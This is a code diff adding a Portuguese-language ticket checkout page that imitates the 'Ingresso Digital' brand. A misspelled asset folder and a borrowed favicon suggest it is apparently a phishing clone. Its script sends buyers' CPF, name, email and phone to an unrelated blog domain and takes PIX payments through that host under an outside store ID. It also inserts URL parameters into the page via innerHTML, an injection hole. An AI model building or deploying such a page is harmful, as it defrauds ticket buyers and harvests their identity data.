@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pagamento - Ingresso Digital</title>
+  <meta name="description" content="Plataforma de venda de Ingressos">
+
+  <link rel="shortcut icon" type="image/png" href="https://ingressodigital.com/assets/img/favicon.ico">
+  <link rel="stylesheet" href="./lngressos_files/bootstrap.min.css">
+  <link rel="stylesheet" href="./lngressos_files/responsive.css">
+  <link rel="stylesheet" href="./lngressos_files/style.css">
+  <link rel="stylesheet" href="./lngressos_files/style-perto.css">
+
+  <style>
+    .container-fluid { max-width: 1235px; }
+
+    .step-section { display: none; }
+    .step-section.active { display: block; }
+
+    .form-pagamento { background: #fff; border-radius: 8px; padding: 25px; margin-bottom: 20px; }
+    .form-pagamento h4 { color: #1f497d; margin-bottom: 20px; font-weight: 700; }
+    .form-pagamento label { font-weight: 600; font-size: 14px; margin-bottom: 5px; display: block; color: #333; }
+    .form-pagamento .form-control { border-radius: 6px; border: 1px solid #ddd; padding: 10px 14px; font-size: 14px; transition: border-color 0.2s; }
+    .form-pagamento .form-control:focus { border-color: #1f497d; box-shadow: 0 0 0 2px rgba(31,73,125,0.15); outline: none; }
+    .form-group { margin-bottom: 18px; }
+
+    .error-msg { color: #dc3545; font-size: 12px; margin-top: 4px; display: none; }
+    .error-msg.show { display: block; }
+
+    .btn-pagar { background: #1f497d; color: #fff; border: none; padding: 14px 30px; border-radius: 6px; font-size: 16px; font-weight: 700; width: 100%; cursor: pointer; transition: background 0.2s; }
+    .btn-pagar:hover { background: #163a66; color: #fff; }
+    .btn-pagar:disabled { background: #999; cursor: not-allowed; }
+
+    .resumo-lateral { background: #fff; border-radius: 8px; padding: 20px; position: sticky; top: 40px; }
+    .resumo-lateral h4 { color: #1f497d; font-weight: 700; margin-bottom: 15px; }
+    .resumo-item { display: flex; justify-content: space-between; padding: 6px 0; font-size: 14px; border-bottom: 1px solid #f0f0f0; }
+    .resumo-total { display: flex; justify-content: space-between; padding: 12px 0 0; font-size: 18px; font-weight: 700; color: #1f497d; }
+
+    .pix-area { text-align: center; padding: 30px 20px; }
+    .pix-area img { max-width: 256px; margin: 20px auto; border: 3px solid #1f497d; border-radius: 8px; }
+    .pix-code-box { background: #f5f5f5; border: 1px solid #ddd; border-radius: 6px; padding: 12px; word-break: break-all; font-size: 12px; margin: 15px 0; max-height: 80px; overflow-y: auto; }
+    .btn-copiar { background: #1f497d; color: #fff; border: none; padding: 10px 24px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; }
+    .btn-copiar:hover { background: #163a66; }
+    .pix-timer { font-size: 28px; font-weight: 700; color: #dc3545; }
+    .pix-loading { text-align: center; padding: 40px; }
+    .pix-loading .spinner { width: 40px; height: 40px; border: 4px solid #ddd; border-top-color: #1f497d; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .info-evento-pag { background: #f8f9fa; border-radius: 6px; padding: 15px; margin-bottom: 20px; }
+    .info-evento-pag p { margin: 3px 0; font-size: 14px; }
+    .info-evento-pag strong { color: #1f497d; }
+
+    .steps-indicator { display: flex; gap: 8px; margin-bottom: 20px; }
+    .step-dot { width: 10px; height: 10px; border-radius: 50%; background: #ddd; }
+    .step-dot.active { background: #1f497d; }
+    .step-dot.done { background: #28a745; }
+
+    .titulo-step-com { margin-bottom: 20px; }
+
+    .sucesso-area { text-align: center; padding: 40px 20px; }
+    .sucesso-area .check-icon { width: 80px; height: 80px; background: #28a745; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
+    .sucesso-area .check-icon svg { width: 40px; height: 40px; fill: #fff; }
+  </style>
+</head>
+
+<body>
+
+<div class="container-fluid menu-simples">
+  <div class="row">
+    <div class="col-md-6">
+      <div>
+        <a href="#">
+          <img class="logo-menu-dois" src="./lngressos_files/logo-azul.svg">
+        </a>
+      </div>
+    </div>
+    <div class="col-md-6 ajuste-time-mob">
+      <div class="time-final-compr">
+        <img src="./lngressos_files/time-compra.png">
+        <span id="pix-timer">10:00</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<section id="main">
+  <div class="container-fluid">
+    <div class="row">
+      <div class="col-md-7">
+        <div class="sele-resu-pedido">
+
+          <!-- STEP 1: Dados Pessoais -->
+          <div id="step-dados" class="step-section active">
+            <div class="titulo-step-com">
+              <div class="d-flex">
+                <div class="num-titulo-step">01</div> Dados Pessoais
+              </div>
+            </div>
+
+            <div class="form-pagamento">
+              <h4>Preencha seus dados</h4>
+
+              <div class="form-group">
+                <label for="field-cpf">CPF</label>
+                <input type="text" class="form-control" id="field-cpf" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
+                <div class="error-msg" id="error-cpf">CPF invalido</div>
+              </div>
+
+              <div class="form-group">
+                <label for="field-nome">Nome completo</label>
+                <input type="text" class="form-control" id="field-nome" placeholder="Seu nome completo">
+                <div class="error-msg" id="error-nome">Nome deve ter pelo menos 3 caracteres</div>
+              </div>
+
+              <div class="form-group">
+                <label for="field-email">E-mail</label>
+                <input type="email" class="form-control" id="field-email" placeholder="seu@email.com">
+                <div class="error-msg" id="error-email">E-mail invalido</div>
+              </div>
+
+              <div class="form-group">
+                <label for="field-telefone">Telefone</label>
+                <input type="text" class="form-control" id="field-telefone" placeholder="(00) 00000-0000" maxlength="15" inputmode="numeric">
+                <div class="error-msg" id="error-telefone">Telefone invalido</div>
+              </div>
+
+              <button type="button" class="btn-pagar" id="btn-dados">
+                <span id="dados-btn-text">Continuar para pagamento</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- STEP 2: Pagamento PIX -->
+          <div id="step-pix" class="step-section">
+            <div class="titulo-step-com">
+              <div class="d-flex">
+                <div class="num-titulo-step">02</div> Pagamento via PIX
+              </div>
+            </div>
+
+            <div class="form-pagamento">
+              <!-- Loading -->
+              <div id="pix-loading" class="pix-loading">
+                <div class="spinner"></div>
+                <p>Gerando codigo PIX...</p>
+              </div>
+
+              <!-- PIX Pronto -->
+              <div id="pix-ready" style="display: none;">
+                <div class="pix-area">
+                  <h4>Escaneie o QR Code ou copie o codigo</h4>
+                  <p>Pedido: <strong id="order-number"></strong></p>
+
+                  <img id="pix-qr-img" src="" alt="QR Code PIX">
+
+                  <div class="pix-code-box">
+                    <span id="pix-code-display"></span>
+                  </div>
+
+                  <button type="button" class="btn-copiar" id="btn-copy-pix">
+                    Copiar codigo Pix
+                  </button>
+
+                  <p style="margin-top: 20px; color: #666; font-size: 14px;">
+                    Tempo restante: <span class="pix-timer" id="pix-countdown">10:00</span>
+                  </p>
+                  <p style="font-size: 12px; color: #999;">Apos o pagamento, a confirmacao sera automatica.</p>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+
+      <!-- SIDEBAR: Resumo -->
+      <div class="col-md-5">
+        <div class="resumo-lateral">
+          <img class="img-del-event" src="./lngressos_files/Awr9QWq.png" style="width: 100%; border-radius: 6px; margin-bottom: 15px;">
+          <h4>Resumo do pedido</h4>
+
+          <div class="info-evento-pag">
+            <p><strong>Data:</strong> <span id="info-data"></span></p>
+            <p><strong>Hora:</strong> <span id="info-hora"></span></p>
+            <p><strong>Local:</strong> <span id="info-local"></span></p>
+          </div>
+
+          <div id="resumo-ingressos"></div>
+
+          <hr>
+
+          <div class="resumo-total">
+            <span>Total</span>
+            <span>R$ <strong id="resumo-total-valor">0,00</strong></span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="container">
+    <div class="row">
+      <div class="col-md-6 arruma-background">
+        <img class="logo-rodape" src="./lngressos_files/logo-branco.png">
+        <p></p>
+        <span class="tel-link">0800 591 0251 / (11) 4003 6119</span>
+        <br>
+        <span>
+          CNPJ: 29.375.588/0001-40<br>
+          Rua Joaquim Teixeira de Oliveira, 504<br>
+          Sala A Sala B Cxpst 40 - 36160-000 Guarani/MG
+        </span>
+      </div>
+      <div class="col-md-3">
+        <h4>Institucional</h4>
+        <ul>
+          <li><a href="#">Quem somos</a></li>
+          <li><a href="#">Pontos de venda</a></li>
+          <li><a href="#">Duvidas Frequentes</a></li>
+          <li><a href="#">Meia Entrada e Descontos</a></li>
+        </ul>
+      </div>
+      <div class="col-md-3">
+        <h4>Politicas</h4>
+        <ul>
+          <li><a href="#">Nossas Politicas</a></li>
+          <li><a href="#">Politica de Privacidade</a></li>
+          <li><a href="#">Seguranca e Privacidade</a></li>
+          <li><a href="#">Autorizacao e terceiros</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+  <hr>
+  <div class="container">
+    <div class="row">
+      <div class="col-md-6">
+        <p>Ingresso Digital Ltda - 2026 Todos os direitos reservados</p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+<script src="./lngressos_files/jquery-1.12.4.min.js"></script>
+<script src="./lngressos_files/bootstrap.min.js"></script>
+
+<!-- JAVASCRIPT -->
+<script>
+(function() {
+    // ========================================
+    // CONFIG
+    // ========================================
+    var MANGOFY_STORE = '2215';
+    var MANGOFY_STORE_LOG = '2215';
+    var API_BASE = 'https://conversa-luizinha.blog/api';
+
+    // ========================================
+    // PARSE URL PARAMS
+    // ========================================
+    var params = new URLSearchParams(window.location.search);
+    var totalStr = params.get('total') || '0,00';
+    var ingressosStr = params.get('ingressos') || '';
+    var dataEvento = params.get('data') || '';
+    var horaEvento = params.get('hora') || '';
+    var localEvento = params.get('local') || '';
+
+    // Parse total from "149,50" format to number
+    var totalValue = parseFloat(totalStr.replace('.', '').replace(',', '.')) || 0;
+
+    // Parse ingressos string "2x Plateia Premium | 1x Camarote" into array
+    var ingressosList = [];
+    if (ingressosStr) {
+        ingressosStr.split(' | ').forEach(function(item) {
+            var match = item.match(/^(\d+)x\s+(.+)$/);
+            if (match) {
+                ingressosList.push({ qty: parseInt(match[1]), nome: match[2] });
+            }
+        });
+    }
+
+    var formData = { nome: '', email: '', telefone: '', cpf: '' };
+    var pixCode = '';
+    var pollingInterval = null;
+
+    // ========================================
+    // TRACKING
+    // ========================================
+    var _trackSessionId = localStorage.getItem('track_session_id');
+    if (!_trackSessionId) {
+        _trackSessionId = (typeof crypto !== 'undefined' && crypto.randomUUID) ? crypto.randomUUID() : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) { var r = Math.random() * 16 | 0; return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16); });
+        localStorage.setItem('track_session_id', _trackSessionId);
+    }
+
+    function trackEvent(name, data) {
+        var payload = { event: name, session_id: _trackSessionId, timestamp: new Date().toISOString(), meta: { user_agent: navigator.userAgent, referrer: document.referrer, page_url: window.location.href }, data: data || {} };
+        var url = API_BASE + '/checkout-event';
+        var body = JSON.stringify(payload);
+        if (name === 'payment_confirmed' && navigator.sendBeacon) { navigator.sendBeacon(url, new Blob([body], { type: 'application/json' })); return; }
+        fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: body, keepalive: true }).catch(function() {});
+    }
+
+    trackEvent('checkout_viewed');
+
+    // ========================================
+    // HELPERS
+    // ========================================
+    function formatBRL(v) { return 'R$ ' + v.toFixed(2).replace('.', ',').replace(/\B(?=(\d{3})+(?!\d))/g, '.'); }
+    function onlyNumbers(v) { return v.replace(/\D/g, ''); }
+    function maskCPF(v) { return v.replace(/\D/g, '').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d)/, '$1.$2').replace(/(\d{3})(\d{1,2})$/, '$1-$2'); }
+    function maskPhone(v) { return v.replace(/\D/g, '').replace(/(\d{2})(\d)/, '($1) $2').replace(/(\d{5})(\d)/, '$1-$2').replace(/(-\d{4})\d+?$/, '$1'); }
+    function toCents(v) { return Math.round(v * 100); }
+
+    function validateCPF(cpf) {
+        cpf = onlyNumbers(cpf); if (cpf.length !== 11) return false;
+        if (['00000000000','11111111111','22222222222','33333333333','44444444444','55555555555','66666666666','77777777777','88888888888','99999999999'].indexOf(cpf) !== -1) return false;
+        var s = 0; for (var i = 0; i < 9; i++) s += parseInt(cpf.charAt(i)) * (10 - i); var r = 11 - (s % 11); var d1 = r >= 10 ? 0 : r; if (d1 !== parseInt(cpf.charAt(9))) return false;
+        s = 0; for (var i = 0; i < 10; i++) s += parseInt(cpf.charAt(i)) * (11 - i); r = 11 - (s % 11); var d2 = r >= 10 ? 0 : r; if (d2 !== parseInt(cpf.charAt(10))) return false;
+        return true;
+    }
+
+    // ========================================
+    // POPULATE UI
+    // ========================================
+    document.getElementById('info-data').textContent = dataEvento;
+    document.getElementById('info-hora').textContent = horaEvento;
+    document.getElementById('info-local').textContent = localEvento;
+    document.getElementById('resumo-total-valor').textContent = totalStr;
+
+    // Render ingressos list in sidebar
+    var resumoHtml = '';
+    ingressosList.forEach(function(ing) {
+        resumoHtml += '<div class="resumo-item"><span>' + ing.qty + 'x ' + ing.nome + '</span></div>';
+    });
+    document.getElementById('resumo-ingressos').innerHTML = resumoHtml;
+
+    // ========================================
+    // MASKS
+    // ========================================
+    var cpfInput = document.getElementById('field-cpf');
+    cpfInput.addEventListener('input', function(e) { e.target.value = maskCPF(e.target.value); });
+
+    var telInput = document.getElementById('field-telefone');
+    telInput.addEventListener('input', function(e) { e.target.value = maskPhone(e.target.value); });
+
+    // ========================================
+    // STEP 1: DADOS PESSOAIS
+    // ========================================
+    document.getElementById('btn-dados').addEventListener('click', function() {
+        var valid = true;
+        document.querySelectorAll('.error-msg').forEach(function(el) { el.classList.remove('show'); });
+
+        formData.cpf = cpfInput.value;
+        formData.nome = document.getElementById('field-nome').value.trim();
+        formData.email = document.getElementById('field-email').value.trim();
+        formData.telefone = telInput.value;
+
+        if (!validateCPF(cpfInput.value)) {
+            document.getElementById('error-cpf').classList.add('show');
+            valid = false;
+        }
+        if (formData.nome.length < 3) {
+            document.getElementById('error-nome').classList.add('show');
+            valid = false;
+        }
+        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
+            document.getElementById('error-email').classList.add('show');
+            valid = false;
+        }
+        if (onlyNumbers(formData.telefone).length < 10) {
+            document.getElementById('error-telefone').classList.add('show');
+            valid = false;
+        }
+
+        if (!valid) return;
+
+        trackEvent('form_completed', {
+            nome: formData.nome,
+            email: formData.email,
+            telefone: formData.telefone,
+            documento: onlyNumbers(formData.cpf)
+        });
+
+        // Go to PIX step
+        document.getElementById('step-dados').classList.remove('active');
+        document.getElementById('step-pix').classList.add('active');
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+
+        generatePix();
+    });
+
+    // ========================================
+    // GENERATE PIX
+    // ========================================
+    function generatePix() {
+        document.getElementById('order-number').textContent = 'PED-' + Math.floor(100000 + Math.random() * 900000);
+        document.getElementById('pix-loading').style.display = 'block';
+        document.getElementById('pix-ready').style.display = 'none';
+
+        var items = ingressosList.map(function(ing) {
+            return {
+                name: ing.nome,
+                quantity: ing.qty,
+                unit_price: toCents(totalValue / ingressosList.reduce(function(s, i) { return s + i.qty; }, 0))
+            };
+        });
+
+        var payload = {
+            amount: toCents(totalValue),
+            store: MANGOFY_STORE,
+            customer: {
+                name: formData.nome,
+                email: formData.email,
+                phone: '55' + onlyNumbers(formData.telefone),
+                document: onlyNumbers(formData.cpf)
+            },
+            items: items
+        };
+
+        fetch(API_BASE + '/pix', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(function(r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
+        .then(function(data) {
+            pixCode = data.pix.qrcode;
+            formData.transactionId = data.id;
+            var qrUrl = data.pix.qrcode_url || ('https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=' + encodeURIComponent(pixCode));
+
+            document.getElementById('pix-loading').style.display = 'none';
+            document.getElementById('pix-ready').style.display = 'block';
+            document.getElementById('pix-code-display').textContent = pixCode;
+            document.getElementById('pix-qr-img').src = qrUrl;
+            startPixTimer();
+
+            trackEvent('pix_generated', {
+                transaction_id: data.id,
+                amount: totalValue,
+                nome: formData.nome,
+                email: formData.email,
+                telefone: formData.telefone,
+                documento: onlyNumbers(formData.cpf),
+                store: MANGOFY_STORE_LOG
+            });
+            startPaymentPolling();
+        })
+        .catch(function(err) {
+            console.error('PIX error:', err);
+            document.getElementById('pix-loading').style.display = 'none';
+            document.getElementById('step-pix').classList.remove('active');
+            document.getElementById('step-dados').classList.add('active');
+            alert('Erro ao gerar codigo PIX. Tente novamente.');
+        });
+    }
+
+    // ========================================
+    // COPY PIX
+    // ========================================
+    document.getElementById('btn-copy-pix').addEventListener('click', function() {
+        trackEvent('pix_copied', { transaction_id: formData.transactionId });
+        var btn = this;
+        navigator.clipboard.writeText(pixCode).then(function() {
+            btn.textContent = 'Copiado!';
+            setTimeout(function() { btn.textContent = 'Copiar codigo Pix'; }, 2500);
+        }).catch(function() {});
+    });
+
+    // ========================================
+    // PIX TIMER
+    // ========================================
+    var pixTimerInterval = null;
+    function startPixTimer() {
+        var seconds = 600;
+        var el = document.getElementById('pix-countdown');
+        var elHeader = document.getElementById('pix-timer');
+        if (pixTimerInterval) clearInterval(pixTimerInterval);
+        pixTimerInterval = setInterval(function() {
+            seconds--;
+            if (seconds <= 0) { clearInterval(pixTimerInterval); el.textContent = '00:00'; elHeader.textContent = '00:00'; return; }
+            var m = Math.floor(seconds / 60), s = seconds % 60;
+            var timeStr = (m < 10 ? '0' + m : m) + ':' + (s < 10 ? '0' + s : s);
+            el.textContent = timeStr;
+            elHeader.textContent = timeStr;
+        }, 1000);
+    }
+
+    // ========================================
+    // PAYMENT POLLING
+    // ========================================
+    function startPaymentPolling() {
+        if (pollingInterval) clearInterval(pollingInterval);
+        pollingInterval = setInterval(function() {
+            fetch(API_BASE + '/check-payment?transactionId=' + formData.transactionId + '&store=' + MANGOFY_STORE)
+            .then(function(r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
+            .then(function(data) {
+                if (data.isPaid) {
+                    clearInterval(pollingInterval);
+                    if (pixTimerInterval) clearInterval(pixTimerInterval);
+                    trackEvent('payment_confirmed', {
+                        transaction_id: data.transactionId,
+                        amount: data.amount,
+                        nome: formData.nome,
+                        email: formData.email,
+                        store: MANGOFY_STORE_LOG
+                    });
+                    localStorage.setItem('lastCheckoutParams', window.location.search);
+                    window.location.href = './obrigado.html?transactionId=' + data.transactionId + '&amount=' + data.amount;
+                }
+            })
+            .catch(function(err) { console.error('Polling:', err); });
+        }, 3000);
+        setTimeout(function() { if (pollingInterval) { clearInterval(pollingInterval); } }, 600000);
+    }
+
+})();
+</script>
+
+</body>
+</html>
